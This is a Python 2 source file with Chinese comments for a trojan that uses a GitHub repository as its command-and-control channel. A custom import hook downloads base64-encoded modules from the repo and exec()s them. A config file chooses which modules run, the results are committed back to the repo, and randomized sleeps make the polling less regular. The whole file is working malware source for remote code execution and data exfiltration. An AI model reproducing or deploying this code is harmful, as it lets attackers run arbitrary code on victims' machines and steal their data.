# -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"   # 根據此id決定抓config目錄哪一個JSON檔

trojan_config = "%s.json" % trojan_id     # 建構出JSON檔名
data_path     = "data/%s/" % trojan_id    # 建構出data下子目錄
trojan_modules= []         # 將用來存放要執行的模組

task_queue    = Queue.Queue()
configured    = False

class GitImporter(object): # 每當要載入不存在的模組時，會使用此class

    def __init__(self):
        
        self.current_module_code = ""
        
    
    def find_module(self,fullname,path=None): # 嘗試去找到模組
        
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)  # 從GitHub
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)  # 解碼
                return self
            
                
        return None

    def load_module(self,name):  # 實際去載入模組 (在找到模組後)
        
        module = imp.new_module(name)  # 使用imp模組去建立一個空白新的模組
        
        exec self.current_module_code in module.__dict__   # 把GitHub抓到的模組放進去
        
        sys.modules[name] = module   # 加入模組清單中
        
        return module



def connect_to_github():
    gh = login(username="yyyy",password="xxxxxxx")  # 放入你的GitHub帳密
    #print gh.me()
    #print gh.me().name
    #print gh.me().login
    #print gh.me().followers_count

    repo = gh.repository("yyyy", "chapter7")
    branch = repo.branch("master")    
    return gh,repo,branch

def get_file_contents(filepath): # 從GitHub取得檔案(設定檔或模組檔)，讀到本機
    
    gh,repo,branch = connect_to_github()  # 連線到GitHub
        
    #tree = branch.commit.commit.tree.recurse() # github3 v.0.9.1用法
    tree = branch.commit.commit.tree.to_tree().recurse() # 新版github3用法
    
    for filename in tree.tree:
        
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            
            blob = repo.blob(filename._json_data['sha'])
            
            return blob.content  # 傳回檔案內容

    return None

def get_trojan_config():  # 從GitHub取得config json檔，以確定要執行那些模組
    global configured
    
    config_json   = get_file_contents(trojan_config)
    print "xxx:", base64.b64decode(config_json)
    config        = json.loads(base64.b64decode(config_json))
    print "yyy:", config
    configured    = True
    
    for task in config:
        
        if task['module'] not in sys.modules:
            print "import %s" % task['module']            
            exec("import %s" % task['module'])  # 由GitHub匯入的模組
            
    return config

def store_module_result(data): # 將木馬端執行結果push到GitHub
    
    gh,repo,branch = connect_to_github()
    
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    print "zzzz:", remote_path                               
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

def module_runner(module):

    task_queue.put(1)
    result = sys.modules[module].run()  # 執行模組內的run函式
    task_queue.get()
    
    # store the result in our repo
    store_module_result(result)  # 將執行結果放在GitHub
    
    return



sys.meta_path = [GitImporter()]  # 加入前面寫的模組載入器

while True:  # 木馬主迴圈
    
    if task_queue.empty():

        config = get_trojan_config() # 從GitHub取得設定檔
        
        for task in config:  # 執行設定檔中指名要執行的每一個模組
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
            
    time.sleep(random.randint(1000,10000))
        